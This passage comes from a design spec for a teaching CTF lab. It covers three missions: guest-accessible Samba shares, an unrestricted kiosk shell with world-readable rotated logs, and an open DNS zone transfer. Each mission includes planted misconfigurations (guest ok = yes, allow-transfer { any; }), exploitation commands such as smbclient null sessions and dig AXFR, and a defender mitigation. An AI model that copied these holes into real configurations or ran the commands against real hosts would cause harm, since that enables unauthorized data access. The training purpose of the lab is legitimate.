server's shares, connect to `Finance_Shared` with a null/guest session, and find a flag
hidden among ordinary finance documents. The defender must lock that one share down to
authenticated finance staff without breaking it — or the server's other legitimate shares.

### 14.2 HID reconnaissance for this mission

| Item | Decision |
|---|---|
| Recon actions | Same minimal set as the prior three missions: `hostname`, `hostname -I`, `whoami`, `cat /etc/os-release`, fixed `MISSION_ID=shared-secrets`. The SMB server's existence and share layout are discovered through the website and SMB enumeration itself, not the HID. |
| Output fields | Identical schema to §6.2, `mission_id` value `"shared-secrets"`. |
| Transport | Reuses the §6.3 receiver unchanged. |
| Exfil content boundary | Same boundary as the prior missions. |

### 14.3 Website route(s) & exposed resource

| Item | Decision |
|---|---|
| Active sections | Home, Employee Resources. |
| Clue location | An Employee Resources "How to connect to shared drives" how-to article that references the internal path `\\aurelion-fs\Finance_Shared` as an example screenshot/instruction — giving the attacker the share name without giving credentials or implying it's misconfigured. |
| Realism guard | Written as a genuine internal IT how-to (the kind of doc that outlives the misconfiguration it inadvertently points at), not a hint sheet. |

### 14.4 Filesystem / clue design

Exposed via the SMB share itself. `Finance_Shared` contains:

- `Org_Chart.pdf` — decoy, irrelevant content.
- `Meeting_Notes_Jan.docx` — decoy, irrelevant content.
- `Budget_2025_Q3.xlsx` — decoy; plausible but not the clue.
- `Expense_Report_Archive.csv` — **the real file**: a routine expense-report export
  (`date, department, amount, notes` columns) with the flag embedded in one row's `notes`
  field (see §14.6).

The Samba server also exposes 1–2 ordinary shares (e.g. a `Public` read-only share with
harmless content) alongside `Finance_Shared`, so enumeration genuinely requires picking
the right share out of several, not just connecting to "the only thing there."

### 14.5 Core vulnerability & exploitation path

1. Attacker reads the Employee Resources article, learns the share name
   `Finance_Shared` (and the server's role) without any credentials.
2. `smbclient -L //<target-ip>/ -N` (null session) enumerates available shares — sees
   `Public`, `Finance_Shared`, `IPC$`, `print$`.
3. `smbclient //<target-ip>/Finance_Shared -N` connects with a guest/null session (**the
   vulnerability**: this share should require the `finance` group, but guest access was
   left enabled), lists and downloads the four files.
4. Skims `Expense_Report_Archive.csv` (not the pdf/docx/xlsx decoys), finds the flag in
   one row's `notes` column.

### 14.6 Flag placement

One CSV row reads like:
`2026-01-14,Finance,4820.00,"Reconciled against Q4 invoice. Ref: FLAG{...}"` — formatted
identically to the other rows, so skimming the whole file (not just opening it and
stopping) is required.

### 14.7 Defender workflow, logs & mitigation

| Item | Decision |
|---|---|
| Log source | Samba's own log (`/var/log/samba/log.smbd`, with `vfs_full_audit` enabled on `Finance_Shared` specifically to log connects/reads at the file level). |
| Detection signal | A `guest`/anonymous session authenticating and then reading files under `Finance_Shared` — distinct from the `Public` share's expected anonymous traffic and from the `finance` group's normal authenticated sessions. |
| Approved mitigation | In `smb.conf`, remove `guest ok = yes` from the `[Finance_Shared]` stanza and restrict it to `valid users = @finance`, then restart `smbd`/`nmbd`. `Public` keeps guest access (that's correct for it) — the fix is scoped to the one misconfigured share, not a server-wide guest lockout, which would be overcorrecting and could break `Public`'s intended behavior. |
| Verification account/check | A pre-provisioned `finance-user` Samba account (member of the `finance` group) must still mount/read `Finance_Shared` after mitigation; a fresh null/guest `smbclient` connection to `Finance_Shared` must now be refused, while `Public` remains guest-accessible throughout. |

### 14.8 Container architecture

| Container | Responsibility | Base image | Published port(s) (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site + Employee Resources how-to article naming `Finance_Shared` | `nginx:alpine` | `80` → host `8301+N` |
| `smb-share` | Samba server: `Public` (intentionally guest-ok), `Finance_Shared` (vulnerable guest access), `finance-user` account | Debian/Ubuntu base + `samba` package (or a maintained Samba container image) | `445` (SMB2/3 direct host) → host `4451+N` |

- SMB is kept to **port 445 only** (modern SMB-over-TCP) to avoid the added complexity of
  NetBIOS (139) and its name-resolution dance — fine for a LAN-only lab where clients
  connect by IP, and one less moving part for a beginner-focused mission.
- Two shares on the same server (one intentionally open, one not) is the deliberate
  teaching point: participants must identify *which* misconfiguration matters, not just
  "find an open share."

### 14.9 Deployment, health checks, reset

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, `.env` per defender carrying `PAIR_ID` and the web/SMB port offsets. |
| Health checks | `company-web`: `curl -f http://localhost/ || exit 1`. `smb-share`: `smbclient -L //localhost/ -N || exit 1` (confirms smbd is actually answering share-list requests, not just that the port is open). 10s interval, 3 retries. |
| Resource limits | `company-web`: `mem_limit: 128m, cpus: 0.25`. `smb-share`: `mem_limit: 192m, cpus: 0.5` (Samba is heavier than vsftpd/nginx). |
| Reset procedure | `./reset-mission.sh <pair_id>` → `docker compose -p shared-secrets-<pair_id> down -v && up -d --force-recreate`, reseeding `Finance_Shared`'s content and `guest ok = yes` setting from the built image, undoing any mitigation from the previous round. |

### 14.10 Organizer material

- **Hints (3-tier):**
  1. "AURELION's Employee Resources section explains how staff connect to shared
     drives — what's the share called?"
  2. "Try listing the server's shares without a password first before assuming you need
     credentials."
  3. "Once you're in `Finance_Shared`, the spreadsheet isn't the clue — check the CSV
     export row by row."
- **Solution walkthrough:** read Employee Resources how-to → note share name
  `Finance_Shared` → `smbclient -L //<ip>/ -N` → `smbclient //<ip>/Finance_Shared -N` →
  download/list files → open `Expense_Report_Archive.csv` → flag is in one row's `notes`
  field.
- **Flag submission:** verbal, per §5 — no upload page or form.
- **Acceptance tests:**
  1. The Employee Resources article names `Finance_Shared` without naming credentials or
     stating the misconfiguration outright.
  2. `smbclient -L //<ip>/ -N` lists at least `Public`, `Finance_Shared`, `IPC$`.
  3. Null/guest `smbclient //<ip>/Finance_Shared -N` succeeds pre-mitigation and lists
     exactly the four files from §14.4.
  4. `Expense_Report_Archive.csv` contains the round's flag in exactly one row's `notes`
     field.
  5. `Public` remains guest-accessible throughout (pre- and post-mitigation) — confirms
     the fix was scoped, not a blanket lockout.
  6. Post-mitigation: null/guest access to `Finance_Shared` is refused; `finance-user`
     still authenticates and reads it.
  7. A mitigation that disables guest access server-wide (breaking `Public`) or stops
     `smbd` entirely **fails** this checklist, per §5's invalid-defensive-actions list.
  8. `reset-mission.sh` returns the container to the pre-attack state, `Finance_Shared`
     guest access re-enabled.

---

## 15. Broken Trail — complete mission specification

**Subject:** Linux permissions + log analysis (merges the former Broken Permissions and
Log Hunter missions — §1) · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** recognizing a legitimate low-privilege foothold vs. an exploitable one,
reading `ls -la`/`stat` permission bits, finding over-permissive files/directories,
searching across live *and* rotated/compressed logs (`grep`, `zgrep`), distinguishing
signal from volume in log data, defensive permission hardening, and scoping a fix so a
legitimate restricted workflow keeps working.

### 15.1 Story

AURELION gives contractors a limited `guest-kiosk` SSH account to run one approved
diagnostic script — the credentials are published openly on the Support Center site
because the account is *meant* to be low-privilege and non-sensitive. That part isn't the
vulnerability. The real problem is twofold: the account's shell was never actually
restricted to that one script, and the application log directory it can therefore browse
into was left world-readable when it should only be readable by the app's own service
account. The attacker's job isn't to break in — they're handed the front door — it's to
notice what an "intended to be harmless" account can actually reach, and dig a flag out of
a pile of rotated log files. The defender's job is to close both gaps (the shell and the
permissions) without breaking the diagnostic script contractors are supposed to run.

### 15.2 HID reconnaissance for this mission

| Item | Decision |
|---|---|
| Recon actions | Same minimal set as every other mission: `hostname`, `hostname -I`, `whoami`, `cat /etc/os-release`, fixed `MISSION_ID=broken-trail`. |
| Output fields | Identical schema to §6.2, `mission_id` value `"broken-trail"`. |
| Transport | Reuses the §6.3 receiver unchanged. |
| Exfil content boundary | Same boundary as every prior mission. |

### 15.3 Website route(s) & exposed resource

| Item | Decision |
|---|---|
| Active sections | Home, Support Center. |
| Clue location | A Support Center "Contractor Diagnostic Access" page states the `guest-kiosk` username and password plainly, framed as intended, limited access for running a specific read-only diagnostic tool — **not** a leak or mistake; this is the one mission where credentials are handed over outright, which is itself the point (the vulnerability is downstream of the login, not the login itself). |
| Realism guard | Phrased like a genuine onboarding doc for contractors, not a CTF hint — down to a short "do not use for anything other than the diagnostic tool" note that a careless defender's setup didn't actually enforce. |

### 15.4 Filesystem / clue design

After logging in as `guest-kiosk`, the attacker finds:

- `/var/log/aurelion-app/` — **the vulnerability**: directory mode `0755` owned by
  `app-service:app-service`, containing files at mode `0644` — world-readable, when it
  should be `0750`/`0640` restricted to an `appadmin` group `guest-kiosk` isn't in.
- `aurelion-app.log` (current) — hundreds of routine `INFO`/`DEBUG` lines, no flag — a
  decoy by volume, not by content (teaches "don't stop at the live file").
- `aurelion-app.log.1`, `aurelion-app.log.2.gz`, `aurelion-app.log.3.gz` — rotated
  archives; one of the `.gz` files contains the flag on a single `DEBUG` line buried
  among routine entries (see §15.6).

### 15.5 Core vulnerability & exploitation path

1. Attacker reads the Support Center page, gets `guest-kiosk`'s credentials outright —
   no cracking, no brute force (deliberately different from Hydra's Trial).
2. SSH in as `guest-kiosk`; discovers the shell is a normal, unrestricted `bash` instead
   of being locked to the one diagnostic script (**misconfiguration #1**).
3. `ls -la /var/log/` shows `aurelion-app/` is readable by any local user
   (**misconfiguration #2** — the actual data-exposure bug).
4. Lists `/var/log/aurelion-app/`, sees both the live log and rotated/compressed
   archives.
5. Greps the live log first (`grep -i flag aurelion-app.log`) — nothing. Has to think to
   check the rotated files too: `zgrep -i flag aurelion-app.log.*.gz` (or
   `zcat ... | grep`) surfaces the flag line in one of the `.gz` archives.

### 15.6 Flag placement

Inside one rotated, gzip-compressed log file, amid routine entries, a line reads like:
`2025-11-03T02:14:09Z DEBUG session.trace: context dump token=FLAG{...}` — framed as an
accidental debug-level data dump (a believable real-world cause of "secrets ended up in
logs"), not a labeled flag file.

### 15.7 Defender workflow, logs & mitigation

| Item | Decision |
|---|---|
| Log source | `auth.log` for the (expected, legitimate-looking) `guest-kiosk` SSH login; `auditd` rules on `/var/log/aurelion-app/` to log file reads by UID, since that's the actual signal — the login itself isn't anomalous. |
| Detection signal | `guest-kiosk` reading files under `/var/log/aurelion-app/` at all (any read is out of scope for an account meant to run one fixed diagnostic command) — not a brute-force pattern like the other missions, which is the point of pairing "permissions" with "logs": sometimes the attack *is* the legitimate account doing something it technically can, but shouldn't be able to. |
| Approved mitigation | Two scoped fixes, both required: (a) `chmod 0750` the directory and `0640` the files, `chgrp appadmin` them, so only `app-service`/`appadmin`-group members can read; (b) replace `guest-kiosk`'s shell with a forced-command wrapper (e.g. a short script set as its login shell via `chsh`, or an SSH `ForceCommand` in `sshd_config` for that user) that runs only the intended diagnostic tool and exits — closing the "unrestricted shell" gap, not just the file-permission one. Revoking `guest-kiosk`'s SSH access entirely fails §5's invalid-defensive-actions list, since contractors are supposed to retain diagnostic access. |
| Verification account/check | After mitigation, `guest-kiosk` can still successfully run the intended diagnostic command (the one legitimate thing it's for) but can no longer read `/var/log/aurelion-app/` or get an interactive shell; a separate `appadmin` account can still read the logs normally. |

### 15.8 Container architecture

| Container | Responsibility | Base image | Published port (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site + Support Center "Contractor Diagnostic Access" page with `guest-kiosk` credentials | `nginx:alpine` | `80` → host `8401+N` |
| `broken-trail-ssh` | SSH service with `guest-kiosk` (unrestricted shell, vulnerability), `app-service`/`appadmin` accounts, `/var/log/aurelion-app/` (world-readable, live + rotated logs with the flag) | `debian:bookworm-slim` + `openssh-server` | `22` → host `2401+N` |

### 15.9 Deployment, health checks, reset

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, `.env` per defender carrying `PAIR_ID` and the web/SSH port offsets. |
| Health checks | `company-web`: `curl -f http://localhost/ || exit 1`. `broken-trail-ssh`: `nc -z localhost 22 || exit 1`. 10s interval, 3 retries. |
| Resource limits | `mem_limit: 256m, cpus: 0.5` per container, matching Hydra's Trial's SSH-container sizing. |
| Reset procedure | `./reset-mission.sh <pair_id>` → `docker compose -p broken-trail-<pair_id> down -v && up -d --force-recreate`, which reseeds `/var/log/aurelion-app/`'s permissions back to world-readable, `guest-kiosk`'s shell back to unrestricted `bash`, and regenerates the rotated logs (with the flag line's position re-randomized among the routine entries) — undoing any mitigation and preventing the next round's attacker from just reusing the previous round's known line number. |

### 15.10 Organizer material

- **Hints (3-tier):**
  1. "Not every account needs a password you have to crack — sometimes it's handed to
     you. The real question is what that account can actually reach once you're in."
  2. "Check the permissions on AURELION's application log directory — not everything
     under `/var/log` should be world-readable."
  3. "The flag isn't in the live log. AURELION rotates and compresses old logs — go
     looking there."
- **Solution walkthrough:** read Support Center page → SSH in as `guest-kiosk` → notice
  unrestricted shell → `ls -la /var/log/aurelion-app/` → see it's world-readable →
  `grep` the live log (nothing) → `zgrep -i flag aurelion-app.log.*.gz` → flag found.
- **Flag submission:** verbal, per §5 — no upload page or form.
- **Acceptance tests:**
  1. Support Center page states `guest-kiosk`'s credentials plainly; SSH login with them
     succeeds pre-mitigation with no cracking required.
  2. Pre-mitigation, `guest-kiosk`'s shell accepts arbitrary commands (not just the
     diagnostic tool) — confirms the account-scope half of the vulnerability.
  3. Pre-mitigation, `ls -la /var/log/aurelion-app/` and its files are world-readable by
     `guest-kiosk`.
  4. The directory contains a live log with no flag and at least one rotated/compressed
     archive that does — confirm the flag is not findable via the live file alone.
  5. `zgrep`/`zcat`+`grep` against the archives surfaces the round's assigned flag.
  6. Post-mitigation: `guest-kiosk` can still run its intended diagnostic command.
  7. Post-mitigation: `guest-kiosk` can no longer get an interactive shell or read
     `/var/log/aurelion-app/`; `appadmin` still can.
  8. A mitigation that revokes `guest-kiosk`'s SSH access outright, or that only fixes
     the file permissions without touching the unrestricted shell (or vice versa),
     **fails** this checklist — both halves of the fix are required.
  9. `reset-mission.sh` restores world-readable permissions, an unrestricted shell, and a
     freshly re-randomized flag position in the rotated logs for the next round.

---

## 16. Name Game — complete mission specification

**Subject:** DNS · **Difficulty:** beginner → beginner-intermediate
**Skills taught:** DNS record types (A, NS, SOA, TXT), what a zone transfer (AXFR) is and
why it's normally restricted, using `dig` to enumerate a zone, reading through multiple
same-type records to find the one that matters, DNS query-log analysis, scoping a fix to
the one query type that's actually a problem.

### 16.1 Story

AURELION's internal DNS zone, `aurelion.internal`, is used for service discovery across
their infrastructure. The authoritative server for that zone was configured to allow zone
transfers from *any* host, not just its legitimate secondary — a classic "it worked in
testing and nobody locked it down before go-live" mistake. The attacker needs to learn the
zone's name from the website, pull the entire zone with a single `dig ... AXFR`, and find
a flag hidden in one of several TXT records. The defender needs to restrict transfers to
the real secondary without breaking normal DNS resolution for everyone else — which, done
correctly, requires touching almost nothing, since AXFR and ordinary lookups are different
things.

### 16.2 HID reconnaissance for this mission

| Item | Decision |
|---|---|
| Recon actions | Same minimal set as every other mission: `hostname`, `hostname -I`, `whoami`, `cat /etc/os-release`, fixed `MISSION_ID=name-game`. |
| Output fields | Identical schema to §6.2, `mission_id` value `"name-game"`. |
| Transport | Reuses the §6.3 receiver unchanged. |
| Exfil content boundary | Same boundary as every prior mission. |

### 16.3 Website route(s) & exposed resource

| Item | Decision |
|---|---|
| Active sections | Home, Infrastructure. |
| Clue location | An Infrastructure page states that "service discovery across AURELION's internal systems relies on the internal DNS zone `aurelion.internal`" — giving the zone name, nothing about IPs, ports, or the misconfiguration itself. The attacker already has the target IP from HID recon. |
| Realism guard | Framed as a routine infra-overview blurb, the kind of sentence that would appear on an internal wiki page without anyone thinking twice about it. |

### 16.4 Filesystem / clue design

No filesystem step — like Hidden Page (§12) and Broken Trail's rotated-log hunt (§15),
this mission's entire investigation happens through its own protocol. The "several
records, one matters" pattern (established in §12's incident table, §13's manifest log,
§14's CSV) repeats here as "several TXT records, one matters."

### 16.5 Core vulnerability & exploitation path

1. Attacker reads the Infrastructure page, learns the zone name `aurelion.internal`.
2. `dig @<target-ip> aurelion.internal AXFR` — **succeeds**, because `named.conf` has
   `allow-transfer { any; };` instead of restricting to the legitimate secondary's IP
   (**the vulnerability**).
3. The transfer returns the full zone: `SOA`, `NS`, several decoy `A` records (`vpn.`,
   `backup.`, `legacy-ftp.`, `printer.` — all `aurelion.internal` subdomains with no
   special significance), and several `TXT` records.
4. Attacker reads through the TXT records — most look like ordinary domain-verification
   and mail-auth clutter (an SPF-style string, a DKIM-selector pointer, a generic
   site-verification token); one is the flag (§16.6).

### 16.6 Flag placement

Among 3–4 TXT records, one — attached to a decoy subdomain like
`_internal-audit.aurelion.internal` — reads like:
`"ref=FLAG{...}; status=rotated"` — formatted closely enough to the surrounding
verification-style TXT records that the attacker has to actually read each one, not just
spot an obviously different format.

### 16.7 Defender workflow, logs & mitigation

| Item | Decision |
|---|---|
| Log source | BIND query log (`named` query logging enabled, e.g. `/var/log/named/query.log`), which records query type per request. |
| Detection signal | An `AXFR`-type query from an IP that isn't the pre-approved secondary — distinguishable by query type alone, not volume or timing like the other missions' log-based detections. |
| Approved mitigation | Restrict `allow-transfer` in the zone's `named.conf` block to only the legitimate secondary's IP (`SECONDARY_DNS_IP`, set per defender in `.env`), then reload BIND (`rndc reload`). Disabling the DNS service, or blocking all queries rather than just unauthorized AXFR, fails §5's invalid-defensive-actions list — and would break service discovery for the whole fictional company. |
| Verification account/check | Two checks, both required: (1) an AXFR attempt from `SECONDARY_DNS_IP` still succeeds after mitigation; (2) ordinary, non-AXFR lookups (e.g. `dig @<ip> vpn.aurelion.internal A`) keep working throughout, before and after — confirming the defender understood that only the transfer, not resolution in general, needed restricting. |

### 16.8 Container architecture

| Container | Responsibility | Base image | Published port (per-defender offset) |
|---|---|---|---|
| `company-web` | AURELION site + Infrastructure page naming the `aurelion.internal` zone | `nginx:alpine` | `80` → host `8501+N` |
| `name-server` | Authoritative BIND9 for `aurelion.internal`, zone records including the flag TXT record, `allow-transfer { any; }` (the vulnerability) | `debian:bookworm-slim` + `bind9` | `53/tcp` + `53/udp` → host `5300+N` (same port number for both protocols) |

No separate "secondary DNS" container is needed to run the verification check —
`SECONDARY_DNS_IP` in the defender's `.env` is simply the IP the organizer's verification
script issues its AXFR from (which can be the organizer's own host or any designated
machine on the lab LAN); building a second full DNS server just to prove one IP is
allow-listed would add a container without adding a distinct skill, consistent with
Hidden Page's single-container design in §12.8.

### 16.9 Deployment, health checks, reset

| Item | Decision |
|---|---|
| Orchestration | `docker-compose.yml` per mission, `.env` per defender carrying `PAIR_ID`, the web/DNS port offsets, and `SECONDARY_DNS_IP`. |
| Health check | `company-web`: `curl -f http://localhost/ || exit 1`. `name-server`: `dig @127.0.0.1 aurelion.internal SOA +short || exit 1` (confirms BIND is actually answering authoritatively, not just that port 53 is open). 10s interval, 3 retries. |
| Resource limits | `company-web`: `mem_limit: 128m, cpus: 0.25`. `name-server`: `mem_limit: 128m, cpus: 0.25` (BIND is light for a zone this small). |
| Reset procedure | `./reset-mission.sh <pair_id>` → `docker compose -p name-game-<pair_id> down -v && up -d --force-recreate`, reseeding `allow-transfer { any; }`, the zone file, and re-randomizing which TXT record carries the flag among the decoys for the next round. |

### 16.10 Organizer material

- **Hints (3-tier):**
  1. "AURELION's Infrastructure page mentions an internal DNS zone used for service
     discovery — what's it called?"
  2. "DNS servers can be asked for a single record, or for the whole zone at once. Look
     up what a zone transfer is and how `dig` does one."
  3. "The flag isn't in an A record, and it's not the only TXT record either — read
     through all of them."
- **Solution walkthrough:** read Infrastructure page → note zone name
  `aurelion.internal` → `dig @<ip> aurelion.internal AXFR` → read through the returned
  TXT records → flag is in the one attached to `_internal-audit.aurelion.internal`.
- **Flag submission:** verbal, per §5 — no upload page or form.
- **Acceptance tests:**
  1. Infrastructure page names `aurelion.internal` without naming an IP, port, or the
     misconfiguration itself.
  2. `dig @<ip> aurelion.internal AXFR` succeeds pre-mitigation and returns `SOA`, `NS`,
     several `A` records, and 3–4 `TXT` records.
  3. Exactly one TXT record contains the round's flag, formatted closely enough to the
     others that it isn't trivially distinguishable without reading each one.
  4. Ordinary (non-AXFR) queries succeed both before and after mitigation.
  5. Post-mitigation: AXFR from `SECONDARY_DNS_IP` still succeeds.
  6. Post-mitigation: AXFR from any other IP is refused (BIND's `REFUSED`/transfer-not-
     allowed response).
  7. A mitigation that disables the DNS service entirely, or restricts ordinary queries
     rather than just unauthorized AXFR, **fails** this checklist per §5.
  8. `reset-mission.sh` restores `allow-transfer { any; }` and re-randomizes the flag's
     TXT record for the next round.
